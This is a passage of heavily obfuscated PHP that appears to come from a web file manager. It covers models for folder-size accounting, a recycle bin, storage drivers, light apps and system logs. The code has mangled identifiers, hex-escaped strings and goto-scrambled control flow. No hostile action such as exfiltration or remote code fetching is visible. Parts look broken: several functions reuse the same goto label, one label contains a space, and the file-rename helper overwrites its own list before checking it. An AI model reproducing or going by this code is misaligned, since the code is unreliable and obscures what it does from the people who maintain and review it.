$C۷ = array($eҦ[395] => array($eҦ[7], $D韐ӂ)); $Bڴ = array($eҦ[552] => USER_ID, $eҦ[417] => time()); goto fቫɋ; fቫɋ: $this->where($C۷)->save($Bڴ); goto b; b: } public function folderSizeReset($F, $Fȏ = false) { goto D; Cȏɼ: $this->where($B͉͂)->setAdd($c儞[78], $Fȏ); CacheLock::unlock($a); $DӚÅ = $c儞[1983] . $CϜխ[$c儞[404]] . $c儞[4] . $CϜխ[$c儞[484]]; goto eȠꐇ; eȠꐇ: $c = array($CϜխ[$c儞[404]], $CϜխ[$c儞[484]]); TaskRun::timeLimitCall($DӚÅ, $c儞[1984], $c, 1.5); goto a; D: $c儞 =& $_SERVER[̉]; if ($this->statusIgnoreResetSpace) { return; } $CϜխ = $this->sourceInfo($F); goto b; b: $a = $c儞[1982] . $F; CacheLock::lock($a, 20); if ($Fȏ === !1) { $this->sourceCacheClear($F); $CϜխ = $this->sourceInfo($F); $B͉͂ = array($c儞[394] => $F, $c儞[422] => 0); $bҿھ = $this->where($B͉͂)->sum($c儞[78]); $Fȏ = intval($bҿھ) - intval($CϜխ[$c儞[78]]); } goto D꽷; D꽷: if ($Fȏ == 0) { return CacheLock::unlock($a); } $eʉ = $this->parentLevelArray($CϜխ[$c儞[487]]); if (!$eʉ) { $eʉ = array(); } goto a֒; a֒: $eʉ[] = $CϜխ[$c儞[395]]; $B͉͂ = array($c儞[395] => array($c儞[411], $eʉ)); if ($Fȏ < 0) { $B͉͂[$c儞[78]] = array($c儞[971], abs($Fȏ)); } goto Cȏɼ; a: } public function folderSizeResetChildren($eΩ) { goto dʇ; e۸: $DЧ[] = $bޜЬ; $DЧ = array_to_keyvalue($DЧ, $fƑ[395]); foreach ($DЧ as $bő => $f) { $DЧ[$bő][$fƑ[1986]] = $DЧ[$bő][$fƑ[78]]; $DЧ[$bő][$fƑ[78]] = 0; } goto Bը; CΤ: $BՊ = array($fƑ[546] => 1, $fƑ[553] => array($fƑ[512], $bޜЬ[$fƑ[487]] . $eΩ . $fƑ[513])); $eЅ = $fƑ[1985]; $DЧ = $this->field($eЅ)->where($BՊ)->select(); goto b񃰅; dʇ: $fƑ =& $_SERVER[̉]; $this->sourceCacheClear($eΩ); $bޜЬ = $this->sourceInfo($eΩ); goto CΤ; Bը: foreach ($dĒ as $f) { $C׹у = $f[$fƑ[478]] . $fƑ[33]; if (!isset($DЧ[$C׹у])) { continue; } if ($f[$fƑ[423]] == $DЧ[$C׹у][$fƑ[423]]) { $DЧ[$C׹у][$fƑ[78]] += $f[$fƑ[78]]; } } foreach ($DЧ as $f) { $Cʆ = $this->parentLevelArray($f[$fƑ[487]]); foreach ($Cʆ as $C׹у) { $C׹у = $C׹у . $fƑ[33]; if (!isset($DЧ[$C׹у])) { continue; } if ($f[$fƑ[423]] == $DЧ[$C׹у][$fƑ[423]]) { $DЧ[$C׹у][$fƑ[78]] += $f[$fƑ[78]]; } } } $F쑇 = array(); goto eԸۗ; b񃰅: $BՊ[$fƑ[403]] = 0; $dĒ = $this->field($eЅ)->where($BՊ)->select(); if (!$dĒ) { return; } goto e۸; eԸۗ: foreach ($DЧ as $f) { if ($f[$fƑ[78]] == $f[$fƑ[1986]]) { continue; } $F쑇[] = array($fƑ[395], $f[$fƑ[395]], $fƑ[78], $f[$fƑ[78]]); } $this->saveAll($F쑇); goto eĐ; eĐ: } public function userSpaceReset($eꤡ = false) { $b =& $_SERVER[̉]; $Aخ = $this->where(array($b[404] => self::TYPE_USER, $b[484] => $eꤡ, $b[403] => 0))->sum($b[78]); $Aخ = !$Aخ || $Aخ <= 0 ? 0 : $Aخ; Model($b[502])->userEdit($eꤡ, array($b[1681] => $Aخ)); } public function targetSpaceUpdate($Cߐ, $C) { $a =& $_SERVER[̉]; if (!$C) { return; } if (!in_array($Cߐ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $Dސ = $this->targetSpaceSize($Cߐ, $C); if ($Cߐ == self::TYPE_USER) { Model($a[502])->userEdit($C, array($a[1681] => $Dސ)); } else { if ($Cߐ == self::TYPE_GROUP) { Model($a[486])->groupEdit($C, array($a[1681] => $Dސ)); } } } public function targetSpaceSize($Fċ, $Dᤓ) { goto b삽; B宿ī: $d隟 = floatval($B[$b[78]]); $C = array($b[553] => array($b[512], $b[498] . $B[$b[395]] . $b[513])); $A낇 = Model($b[421])->field($b[410])->where($C)->select(); goto d; d: $A낇 = array_to_keyvalue($A낇, $b[33], $b[395]); $A낇 = array_unique(array_filter($A낇)); if ($A낇) { $C = array($b[410] => array($b[411], $A낇)); $d隟 += floatval($this->where($C)->sum($b[78])); } goto C佳; b삽: $b =& $_SERVER[̉]; $B = $this->sourceRoot($Fċ, $Dᤓ, !0); if (!$B) { return 0; } goto B宿ī; C佳: $d隟 = !$d隟 || $d隟 <= 0 ? 0 : $d隟; return $d隟; goto Aэ; Aэ: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($C˕) { return $this->fileTypeProfile($C˕, SourceModel::TYPE_USER); } public function groupFileTypeProfile($AռȂł) { return $this->fileTypeProfile($AռȂł, SourceModel::TYPE_GROUP); } private function fileTypeProfile($F, $Cˇ) { goto b訏ލ; eǩ: $Cњڴ = array(); $Cњڴ[$eɧә[1988]] = array($eɧә[1989] => LNG($eɧә[1988]), $eɧә[1990] => $this->where($dЎ)->count(), $eɧә[548] => $this->where($dЎ)->sum($eɧә[78])); $eΧʯ = KodIO::fileTypeList(); goto DʗǊ; DʗǊ: foreach ($eΧʯ as $B => $c) { $dЎ[$eɧә[405]] = $this->fileTypeWhere($B); $Cњڴ[$B] = array($eɧә[1989] => $c[$eɧә[28]], $eɧә[1990] => $this->where($dЎ)->count(), $eɧә[548] => $this->where($dЎ)->sum($eɧә[78])); } Cache::set($C򂧾, $Cњڴ, 1200); return $Cњڴ; goto dƑͭ; Dۆ: if ($Dű) { return $Dű; } $dЎ = array($eɧә[546] => 0); if ($F != !1) { $dЎ[$eɧә[484]] = $F; $dЎ[$eɧә[404]] = $Cˇ; } goto eǩ; b訏ލ: $eɧә =& $_SERVER[̉]; $C򂧾 = $eɧә[1987] . $F . $eɧә[71] . $Cˇ; $Dű = Cache::get($C򂧾); goto Dۆ; dƑͭ: } public function fileNameExist($Eܽ, $A˹) { $fɝ =& $_SERVER[̉]; $f懎ԑ = $this->where(array($fɝ[478] => $Eܽ, $fɝ[28] => $A˹, $fɝ[423] => 0))->find(); return is_array($f懎ԑ) ? $f懎ԑ[$fɝ[395]] : !1; } public function childList($c؊) { goto B̏; dם: $dܿ߉ = array($aΈ[478] => intval($c؊), $aΈ[423] => 0); $AͭѲ = $this->where($dܿ߉)->select(); $AͭѲ = $AͭѲ ? $AͭѲ : array(); goto D; B̏: $aΈ =& $_SERVER[̉]; $b = $aΈ[1965] . $c؊; if (isset(self::$cacheChildList[$b])) { return self::$cacheChildList[$b]; } goto dם; D: self::$cacheChildList[$b] = $AͭѲ; foreach ($AͭѲ as $BĖ) { $b = $aΈ[438] . $BĖ[$aΈ[395]]; self::$cacheSourceInfo[$b] = $BĖ; } return $AͭѲ; goto e̔; e̔: } public function fileNameAuto($f㳩ҹ, $cۺ, $dҢƣ = REPEAT_RENAME, $F͌ = false) { $cث =& $_SERVER[̉]; $bĊ = array($cث[478] => $f㳩ҹ, $cث[423] => 0, $cث[28] => array($cث[380], $cۺ . $cث[381])); $fӍ = $this->field($cث[28])->where($bĊ)->select(); $AꫠЗ = array_to_keyvalue($fӍ, $cث[33], $cث[28]); return $this->fileNameAutoGet($AꫠЗ, $cۺ, $dҢƣ, $F͌); } public function fileNameAutoGet($b, $B踑ਃ, $cɄ, $A颈) { $aǐ =& $_SERVER[̉]; if ($cɄ == REPEAT_REPLACE || !$b || !in_array_not_case($B踑ਃ, $b) || $A颈 && $cɄ != REPEAT_RENAME_FOLDER) { return $B踑ਃ; } if ($cɄ == REPEAT_SKIP) { return !1; } $Aݍ = $aǐ[95] . get_path_ext($B踑ਃ); $Aݍ = $Aݍ == $aǐ[95] || $A颈 ? $aǐ[33] : $Aݍ; for ($f´ = 1; $f´ <= count($b) + 1; $f´++) { $cķ = substr($B踑ਃ, 0, strlen($B踑ਃ) - strlen($Aݍ)); $b = $cķ . "\x28{$f´}\51{$Aݍ}"; if (!in_array_not_case($b, $b)) { return $b; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\137\163\157\x75\x72\x63\145\x5f\162\145\x63\171\143\x6c\x65"; protected $dataAuto = array(array("\143\162\145\x61\x74\145\124\151\155\x65", "\x74\x69\155\x65", "\x69\156\163\145\162\x74", "\146\x75\156\143\x74\x69\157\156")); public function listData($CԞǠ = false) { $B =& $_SERVER[̉]; $CԞǠ = $CԞǠ ? $CԞǠ : USER_ID; $E = $this->where(array($B[1523] => $CԞǠ))->select(); return array_to_keyvalue($E, $B[33], $B[395]); } public function moveToRecycle($b󮑣) { goto Dݹ; fܰ: $this->recycleMove($b󮑣, 1); if ($c[$aӆ[403]] == $aӆ[87]) { $bه拄 = array($aӆ[553] => array($aӆ[512], $c[$aӆ[487]] . $b󮑣 . $aӆ[513])); $Aٕ->where($bه拄)->setField($aӆ[423], 1); } goto Dί盩; c͌ߎ: if (!$c || $c[$aӆ[423]] == $aӆ[87]) { return; } $D = array($aӆ[410] => $b󮑣, $aӆ[1523] => USER_ID, $aӆ[549] => $c[$aӆ[404]], $aӆ[550] => $c[$aӆ[484]], $aӆ[553] => $c[$aӆ[487]]); $this->add($D); goto fܰ; Dݹ: $aӆ =& $_SERVER[̉]; $Aٕ = Model($aӆ[1205]); $c = $Aٕ->sourceInfo($b󮑣); goto c͌ߎ; Dί盩: } public function clear() { $this->remove(!1); } public function remove($Eֈ = false, $bᙲ = false) { goto Fʹ͓; E: $dڛ = $this->listData($bᙲ); $Eֈ = $Eֈ === !1 ? !1 : $Eֈ; $b = array(); goto e밬; e밬: foreach ($dڛ as $dڍ) { if ($Eֈ != !1 && !in_array($dڍ, $Eֈ)) { continue; } $Dȝ = $EҌ->sourceInfo($dڍ); $EҌ->remove($dڍ, !1); $fö = $Dȝ[$E⹥ݍ[404]] . $E⹥ݍ[71] . $Dȝ[$E⹥ݍ[484]]; $b[$fö] = array($E⹥ݍ[549] => $Dȝ[$E⹥ݍ[404]], $E⹥ݍ[484] => $Dȝ[$E⹥ݍ[484]]); $this->where(array($E⹥ݍ[395] => $dڍ))->delete(); } foreach ($b as $b) { $EҌ->targetSpaceUpdate($b[$E⹥ݍ[404]], $b[$E⹥ݍ[484]]); } goto B; Fʹ͓: $E⹥ݍ =& $_SERVER[̉]; $bᙲ = $bᙲ ? $bᙲ : USER_ID; $EҌ = Model($E⹥ݍ[1205]); goto E; B: } public function restore($Cӹ൅ = false) { $d̿ = $this->listData(); $this->_restoreSource($d̿, $Cӹ൅); } public function removeUserAll($dП) { $this->remove(!1, $dП); } private function _restoreSource($fʂ˟, $c٧͚) { goto bЇٌ; bЇٌ: $bތ =& $_SERVER[̉]; $e = Model($bތ[1205]); $c٧͚ = $c٧͚ == !1 ? !1 : $c٧͚; goto a; bِ: $e->updateModifyTime($FɅ); goto cȃ; a: if (!$fʂ˟) { return !0; } $FɅ = array(); foreach ($fʂ˟ as $cѐ) { goto Bر; E ăӱ: if ($BΆ[$bތ[403]] == $bތ[87]) { $d킂䉌 = array($bތ[553] => array($bތ[512], $BΆ[$bތ[487]] . $cѐ . $bތ[513])); $e->where($d킂䉌)->setField($bތ[423], 0); $this->restoreFolderChildren($cѐ, $fʂ˟); } $this->where(array($bތ[395] => $cѐ))->delete(); $e->folderSizeReset($BΆ[$bތ[478]]); goto C; C: $FɅ[] = $BΆ[$bތ[478]]; if ($BΆ[$bތ[403]] == $bތ[87]) { $FɅ[] = $cѐ; } $e->lockMoveEnd($cѐ); goto cԅ; Bر: if ($c٧͚ != !1 && !in_array($cѐ, $c٧͚)) { continue; } $BΆ = $e->sourceInfo($cѐ); $a = $e->sourceInfo($BΆ[$bތ[478]]); goto aἮѪ; aἮѪ: if ($a[$bތ[423]] == $bތ[87]) { continue; } $e->lockMoveStart($cѐ); $this->recycleMove($cѐ, 0); goto E ăӱ; cԅ: } goto bِ; cȃ: } private function restoreFolderChildren($eǘ, $f) { goto A; dÃ: $bڧͲ[$f[395]][1] = array_unique($bڧͲ[$f[395]][1]); $bڧͲ[$f[956]] = $f[1782]; $e->where($bڧͲ)->setField($f[423], 1); goto Cќ; cͷ: foreach ($f as $C) { if ($C == $eǘ) { continue; } if (!$e->isParentOf($eǘ, $C)) { continue; } $eěׯ = $e->sourceInfo($C); if ($eěׯ[$f[403]] == $f[87]) { $bڧͲ[] = array($f[553] => array($f[512], $eěׯ[$f[487]] . $C . $f[513])); } else { $bڧͲ[$f[395]][1][] = $C; } } if (!$bڧͲ[$f[395]][1]) { unset($bڧͲ[$f[395]]); } if (!$bڧͲ) { return; } goto dÃ; A: $f =& $_SERVER[̉]; $e = Model($f[1205]); $bڧͲ = array($f[395] => array($f[7], array())); goto cͷ; Cќ: } private function recycleMove($FƑ, $EՎ = 1) { $aϽ =& $_SERVER[̉]; $Eߐ = Model($aϽ[1205]); $Cň = Model($aϽ[1991]); $Cᦟ = array($aϽ[395] => $FƑ); if ($EՎ) { $Eߐ->where($Cᦟ)->setField($aϽ[423], 1); $Cň->eventRecycle($FƑ, $aϽ[1992]); } else { $c = $Eߐ->where($Cᦟ)->find(); $aЍ = $c[$aϽ[403]] == $aϽ[87]; $F̡Ǳ = $Eߐ->fileNameAuto($c[$aϽ[478]], $c[$aϽ[28]], REPEAT_RENAME_FOLDER, $aЍ); if ($F̡Ǳ != $c[$aϽ[28]]) { $Eߐ->rename($FƑ, $F̡Ǳ); } $Eߐ->where($Cᦟ)->setField($aϽ[423], 0); $Cň->eventRecycle($FƑ, $aϽ[1993]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\155\56\x73\164\x6f\162\141\x67\145\114\x69\163\164"; public $field = array("\x6e\141\155\x65", "\x73\x69\172\145\115\x61\x78", "\x73\x79\163\164\x65\x6d", "\x64\x65\146\141\165\x6c\164", "\x64\x72\x69\x76\145\162", "\143\157\x6e\x66\151\147"); public function listData($fߺ = false, $c = "\155\157\144\x69\x66\x79\x54\151\155\145", $eς = false) { $Bݍ𽏶 =& $_SERVER[̉]; $bɭ = parent::listData($fߺ, $c, $eς); if ($fߺ) { return $bɭ; } $B = $this->ioSizeUseGet(array_to_keyvalue($bɭ, $Bݍ𽏶[33], $Bݍ𽏶[393])); foreach ($bɭ as $b차 => $cߠʱ) { unset($bɭ[$b차][$Bݍ𽏶[6]]); $bɭ[$b차][$Bݍ𽏶[1681]] = isset($B[$cߠʱ[$Bݍ𽏶[393]]]) ? $B[$cߠʱ[$Bݍ𽏶[393]]] : 0; } return $bɭ; } public function ioSizeUseGet($Fㅑ) { goto b㷓; b㷓: $F =& $_SERVER[̉]; if (!$Fㅑ) { return array(); } $Bҕ = $F[1994] . implode($F[47], $Fㅑ); goto c; c: $Dߏǃ = array($F[785] => array($F[7], $Fㅑ)); $a٫ꉇ = Model($F[750])->field($e̅)->where($Dߏǃ)->group($F[785])->select(); $a٫ꉇ = array_to_keyvalue($a٫ꉇ, $F[393], $F[78]); goto bǯ䵉; bǯ䵉: Cache::set($Bҕ, $a٫ꉇ, 600); return $a٫ꉇ; goto c̈́Ľ; c: $a٫ꉇ = Cache::get($Bҕ); if ($a٫ꉇ) { return $a٫ꉇ; } $e̅ = array($F[785] => $F[393], $F[1995] => $F[78]); goto c; c̈́Ľ: } public function getConfig($b) { $C = parent::listData($b); return json_decode($C[$_SERVER[̉][6]], !0); } public function update($dꍨȠ, $fٚ) { goto DԨ; DԨ: $D =& $_SERVER[̉]; $Bᚘ = $fٚ[$D[28]]; $c펏͏ = array_to_keyvalue(parent::listData(), $D[28]); goto dӬ; dӬ: if (isset($c펏͏[$Bᚘ]) && $c펏͏[$Bᚘ][$D[393]] != $dꍨȠ) { return !1; } if (isset($fٚ[$D[1996]]) && $fٚ[$D[1996]] == $D[87]) { $this->checkConfig($fٚ); } unset($fٚ[$D[1996]]); goto fƄ; fƄ: $fȾ = parent::update($dꍨȠ, $fٚ); if ($fȾ && $fٚ[$D[34]]) { foreach ($c펏͏ as $B͇) { if ($B͇[$D[34]] && $B͇[$D[393]] != $dꍨȠ) { parent::update($B͇[$D[393]], array($D[34] => 0)); } } } return $fȾ; goto dߝ; dߝ: } public function add($A) { goto B˰; D: return $f垝; goto Bڣ; BȖ: $this->checkConfig($A); $f垝 = parent::insert($A); if ($f垝 && $A[$Dք[34]]) { foreach ($Dԛ as $BΣɋ) { if ($BΣɋ[$Dք[34]]) { parent::update($BΣɋ[$Dք[393]], array($Dք[34] => 0)); } } } goto D; B˰: $Dք =& $_SERVER[̉]; $Dԛ = array_to_keyvalue(parent::listData(), $Dք[28]); if (isset($Dԛ[$A[$Dք[28]]])) { return !1; } goto BȖ; Bڣ: } public function checkConfig(&$F, $Aڈ = false) { goto Cι; A: foreach ($D﷕׮ as $F => $a) { $D﷕׮[$F] = trim($a); } $D﷕׮[$c[1997]] = rand_string(6); $D = $GLOBALS[$c[6]][$c[88]][$c[794]]; goto Fܜ; E: $e֦ = $C->getPath($e . $c[1137]); if (!$C->mkfile($e֦)) { if ($Aڈ) { return LNG($c[2001]); } show_json(LNG($c[2001]), !1); } $D﷕׮[$c[1075]] = $e; goto D; aЦ֭: $C = new $C֩($D﷕׮); if (in_array($e, $C->objectDriver)) { if (!$C->isBucketCors() && !$C->setBucketCors()) { $Fӄ٘ = LNG($c[2001]); $Fӄ٘ .= $c[2002] . LNG($c[2003]); if ($Aڈ) { return $Fӄ٘; } show_json($Fӄ٘, !1); } } $e = rtrim($D﷕׮[$c[1075]], $c[8]) . $c[8]; goto E; D: $F[$c[6]] = json_encode($D﷕׮); $F[$c[94]] = $B݄; return !0; goto C֫; Fܜ: $B݄ = isset($D[$e]) ? $D[$e] : ucfirst($e); $C֩ = $c[72] . $B݄; if (!$B݄ || !class_exists($C֩)) { if ($Aڈ) { return LNG($c[1998]); } write_log(array($c[1999], $F, get_caller_info()), $c[2000]); show_json(LNG($c[1998]), !1, $F); } goto aЦ֭; Cι: $c =& $_SERVER[̉]; $e = strtolower($F[$c[94]]); $D﷕׮ = json_decode($F[$c[6]], !0); goto A; C֫: } public function driverListSystem() { $Cŷڥ =& $_SERVER[̉]; $A˭ = parent::listData(); $DԚ = array(); foreach ($A˭ as $C֩) { unset($C֩[$Cŷڥ[194]], $C֩[$Cŷڥ[84]]); $C֩[$Cŷڥ[6]] = json_decode($C֩[$Cŷڥ[6]], !0); $DԚ[] = $C֩; } return $DԚ; } public function defaultDriver() { $Dɘ =& $_SERVER[̉]; $F凍 = parent::listData(); $D = array_filter_by_field($F凍, $Dɘ[34], 1); $D = $D[0]; if ($D) { $D[$Dɘ[6]] = json_decode($D[$Dɘ[6]], !0); } return $D; } public function driverInfo($A휐) { $aƜ =& $_SERVER[̉]; $A = array_to_keyvalue(parent::listData(), $aƜ[393]); if (!isset($A[$A휐])) { return !1; } $F市ԑ = $A[$A휐]; $F市ԑ[$aƜ[6]] = json_decode($F市ԑ[$aƜ[6]], !0); return $F市ԑ; } public function remove($CԜ) { $this->removeShareItems($CԜ); return parent::remove($CԜ); } public function removeWithFile($dؒ, $B٧) { goto EĹ; d: $E˰ = Model($C[450])->where($fȭ)->sum($C[78]); $f = $B٧ . $C[2004] . $dؒ; $a깎 = new TaskFileTransfer($f, $C[2000], $eїȃ, LNG($C[2005]) . "\x28{$dؒ}\x29"); goto eؚН; eؚН: $a깎->task[$C[726]] = (double) $E˰; $e䈑 = KodIO::defaultDriver(); $fԒ = $e䈑[$C[393]]; goto F؜; d: if (!$B׍) { $a깎->stop($f); return !1; } $a깎->end(); if ($B٧ == $C[1661]) { $this->remove($dؒ); } goto EӉ; EĹ: $C =& $_SERVER[̉]; $fȭ = array($C[785] => $dؒ); $eїȃ = Model($C[450])->where($fȭ)->count(); goto d; F؜: $bģ = "\173\151\157\72{$fԒ}\x7d\57"; $B׍ = !0; $Cδ = array(); goto A£ꬕ; A£ꬕ: $Cã = Model($C[193])->where($fȭ)->field($C[2006])->select(); foreach ($Cã as $C) { goto aџȈ; B: $aڹ = array($C[785] => $fԒ, $C[76] => $F䴺); Model($C[193])->where($fȭ)->save($aڹ); goto e; D: if (IO::exist($F䴺)) { $a깎->updateFileEnd($C[$C[28]], $C[$C[78]]); continue; } if (!IO::move($FǾ, get_path_father($F䴺))) { $B׍ = !1; break; } $fȭ = array($C[447] => $C[$C[447]]); goto B; aџȈ: $FǾ = $C[$C[76]]; $F䴺 = $bģ . str_replace("\173\151\x6f\72{$dؒ}\175\x2f", $C[33], $FǾ); if (!IO::exist($FǾ)) { $Cδ[] = $C[$C[447]]; $a깎->updateFileEnd($C[$C[28]], $C[$C[78]]); continue; } goto D; e: } $this->removeByFileID($Cδ); goto d; EӉ: } public function progress($F݅, $cڞې) { return Task::get($cڞې . $_SERVER[̉][2004] . $F݅); } private function removeByFileID($E堵 = array()) { goto d괃; Aߢ: foreach ($A엨 as $fȎ) { Model($eǴ[409])->removeNow($fȎ, !1); } goto F䑩; d괃: $eǴ =& $_SERVER[̉]; if (empty($E堵)) { return; } $dԌۍ = array($eǴ[447] => array($eǴ[7], $E堵)); goto f; f: $A엨 = Model($eǴ[1205])->where($dԌۍ)->field($eǴ[395])->select(); if (!$A엨) { return; } $A엨 = array_to_keyvalue($A엨, $eǴ[33], $eǴ[395]); goto Aߢ; F䑩: } private function removeShareItems($B͢) { goto f博; cڛ: $dͥ = Model($FД[1672])->where($b)->field($FД[468])->select(); if (empty($dͥ)) { return; } $D̋ = array_to_keyvalue($dͥ, $FД[33], $FД[468]); goto a; f博: $FД =& $_SERVER[̉]; $CΥ = "\173\151\157\72{$B͢}\175\x2f"; $b = array($FД[395] => 0, $FД[1070] => array($FД[380], "{$CΥ}\45")); goto cڛ; a: Model($FД[563])->remove($D̋); goto aޝ; aޝ: } } goto b˜剿; b˜剿: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\155\x2e\114\x69\147\x68\164\101\x70\x70"; public $modelType = "\x53\171\163\x74\x65\x6d\x4f\x70\164\x69\x6f\156"; public $field = array("\156\141\155\x65", "\x67\x72\157\165\160", "\x64\145\163\143", "\143\157\156\164\145\x6e\x74"); public function listData($F = false, $D = "\x6d\157\x64\151\146\171\x54\151\155\x65", $dᑎߌ = true) { return parent::listData($F, $D, $dᑎߌ); } public function remove($dǽã) { $F涣 = $this->findByName($dǽã); if (!$F涣) { return !1; } return parent::remove($F涣[$_SERVER[̉][393]]); } public function add($Dӄ߹Ј) { if ($this->findByName($Dӄ߹Ј[$_SERVER[̉][28]])) { return !1; } return parent::insert($Dӄ߹Ј); } public function update($aﱛ, $a) { $c׈ =& $_SERVER[̉]; $F = $this->findByName($aﱛ); $EΕ = $this->findByName($a[$c׈[28]]); if (!$F || $EΕ && $EΕ[$c׈[393]] != $F[$c׈[393]]) { return !1; } return parent::update($F[$c׈[393]], $a); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\x73\164\145\155\x5f\154\157\147"; protected $dataAuto = array(array("\x63\162\145\141\164\145\x54\151\155\145", "\x74\151\x6d\145", "\151\x6e\x73\145\162\164", "\146\x75\156\143\x74\x69\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $d =& $_SERVER[̉]; return array($d[2007] => LNG($d[2008]), $d[2009] => LNG($d[2010]), $d[1635] => LNG($d[2011]), $d[2012] => LNG($d[2013]), $d[2014] => LNG($d[2015]), $d[2016] => LNG($d[2017]), $d[2018] => LNG($d[2019]), $d[1665] => LNG($d[2019]), $d[1666] => LNG($d[2020]), $d[2021] => LNG($d[2022]), $d[2023] => LNG($d[2024]), $d[2025] => LNG($d[2026]), $d[2027] => LNG($d[2028]), $d[1663] => LNG($d[2029]), $d[2030] => LNG($d[2031]), $d[1670] => LNG($d[2032]), $d[2033] => LNG($d[2034]), $d[2035] => LNG($d[2036]), $d[2037] => LNG($d[2038]), $d[2039] => LNG($d[2040]), $d[1673] => LNG($d[2041]), $d[1674] => LNG($d[2042]), $d[2043] => LNG($d[2044]), $d[2045] => LNG($d[2046]), $d[2047] => LNG($d[2048]), $d[1668] => LNG($d[2049]), $d[2050] => LNG($d[2051]), $d[1667] => LNG($d[2052]), $d[2053] => LNG($d[2054]), $d[2055] => LNG($d[2056]), $d[2057] => LNG($d[2058]), $d[2059] => LNG($d[2059]), $d[2060] => LNG($d[1639]), $d[2061] => LNG($d[2062]), $d[2063] => LNG($d[2064]), $d[2065] => LNG($d[2066]), $d[2067] => LNG($d[2068]), $d[2069] => LNG($d[2070]), $d[2071] => LNG($d[2071]), $d[2072] => LNG($d[2073]), $d[2074] => LNG($d[2075]), $d[2076] => LNG($d[2077]), $d[2078] => LNG($d[2079]), $d[2080] => LNG($d[2081]), $d[2082] => LNG($d[2083])); } private function typeFile() { $f¹ =& $_SERVER[̉]; $F = array($f¹[1670] => array($f¹[1671]), $f¹[2025] => array($f¹[2084]), $f¹[2027] => array($f¹[2085]), $f¹[1663] => array($f¹[1664]), $f¹[2035] => array(), $f¹[2037] => array(), $f¹[2039] => array(), $f¹[1673] => array($f¹[1675]), $f¹[1674] => array($f¹[1675]), $f¹[2043] => array($f¹[2086]), $f¹[2045] => array($f¹[2086]), $f¹[2047] => array($f¹[2087]), $f¹[2033] => array($f¹[2088]), $f¹[1668] => array($f¹[2089]), $f¹[2050] => array($f¹[2090]), $f¹[1667] => array($f¹[1669])); return $F; } private function typeAll() { goto dɍ; F: foreach ($Aġ۷ as $fξ => $e) { $fǎǻ[$e[0]] = $fǎǻ[$fξ]; } $fǎǻ[$Cƺ[1675]] = LNG($Cƺ[2091]); $fǎǻ[$Cƺ[2086]] = LNG($Cƺ[2092]); goto Eě; Eě: return $fǎǻ; goto e숻; dɍ: $Cƺ =& $_SERVER[̉]; $fǎǻ = $this->typeList; $Aġ۷ = array_filter($this->typeFile()); goto F; e숻: } public function addLog($d݆, $Eۄ = array()) { goto d; d: $cʐ̡ =& $_SERVER[̉]; if (!isset($this->typeList[$d݆])) { return; } $cՙ = defined($cʐ̡[454]) && USER_ID ? USER_ID : (isset($Eۄ[$cʐ̡[1531]]) ? $Eۄ[$cʐ̡[1531]] : 0); goto c˓; c: $Eۄ = array($cʐ̡[1522] => Session::sign(), $cʐ̡[1523] => $cՙ, $cʐ̡[29] => $d݆, $cʐ̡[1525] => json_encode($Eۄ)); parent::add($Eۄ); goto d록; c˓: if (!$cՙ) { $cՙ = (int) Session::get($cʐ̡[1821]); } $dя = get_client_ip(); if (!$Eۄ || strlen(json_encode($Eۄ)) >= 1024) { $Eۄ = array($cʐ̡[2093] => $dя); } else { if (is_array($Eۄ)) { $Eۄ[$cʐ̡[2093]] = $dя; } else { $Eۄ = array($cʐ̡[1087] => $Eۄ, $cʐ̡[2093] => $dя); } } goto c; d록: } public function remove($Fѿ) { $this->where(array($_SERVER[̉][412] => $Fѿ))->delete(); } private function _makeOrder($d = '') { goto eſ; cۜҧ: return $this->order($d); goto fپ; eſ: $b优 =& $_SERVER[̉]; $Aҵ = $b优[194]; $CڣȺ = array($b优[428] => $b优[429], $b优[430] => $b优[431]); goto eǕ; eǕ: $fƊ = Input::get($b优[436], $b优[7], $b优[1853], array($b优[1777], $b优[430])); $fƊ = $CڣȺ[$fƊ]; $d = $d . "{$Aҵ}\40{$fƊ}"; goto cۜҧ; fپ: } public function get($B = '') { goto c떰; eɏ: if ($B[$C[1531]]) { $Bք[$C[1531]] = $B[$C[1531]]; } if (isset($B[$C[724]])) { $B¸ω = $B[$C[724]]; $B뷰 = isset($B[$C[476]]) ? $B[$C[476]] : time(); $Bք[$C[194]] = array($C[331], array($B¸ω, $B뷰)); } if ($B[$C[29]]) { $Aο循 = explode($C[47], $B[$C[29]]); $Aٌ = $this->typeFile(); $Fܢ = array(); foreach ($Aο循 as $Fٽ) { $Fܢ[] = $Fٽ; if (isset($Aٌ[$Fٽ])) { $Fܢ = array_merge($Fܢ, $Aٌ[$Fٽ]); } } $Fܢ = array_unique($Fܢ); if ($Fܢ) { $Bք[$C[29]] = array($C[7], $Fܢ); } } else { $Bք[$C[29]] = array($C[2094], $C[2095]); } goto Fܫǐ; eޭϕ: $F߯[$C[367]] = $this->logList($F߯[$C[367]]); return $F߯; goto fɛ; Fܫǐ: if (!empty($B[$C[2093]])) { $Bք[$C[431]] = array($C[380], "\x25{$B[$C[2093]]}\45"); } $F߯ = $this->_makeOrder()->where($Bք)->selectPage(); if (empty($F߯[$C[367]])) { show_json(array(), !0, $F߯[$C[364]]); } goto eޭϕ; c떰: $C =& $_SERVER[̉]; if (!$B) { show_json(array()); } $Bք = array(); goto eɏ; fɛ: } private function ipAddress(&$d) { $e͜ =& $_SERVER[̉]; if (!empty($d[$e͜[2093]])) { $E㵴 = IpLocation::get($d[$e͜[2093]]); } else { $E㵴 = LNG($e͜[2096]); } $d[$e͜[2097]] = $E㵴; } private function descZipDownload($AÂ, &$e) { $E듧 =& $_SERVER[̉]; if (!isset($AÂ[$E듧[2098]])) { return; } $a = json_decode($AÂ[$E듧[2098]], !0); foreach ($a as $Dʹߚ) { try { $aԎӒ = IO::infoFull($Dʹߚ[$E듧[76]]); } catch (Exception $eԂ) { continue; } $AÂ[$E듧[76]] = $Dʹߚ[$E듧[76]]; $e[] = $AÂ[$E듧[395]] = $aԎӒ[$E듧[395]]; $e[] = $AÂ[$E듧[1909]] = $aԎӒ[$E듧[478]]; break; } return $AÂ; } private function getSourceList(&$eԛ̂) { $eÅԃ =& 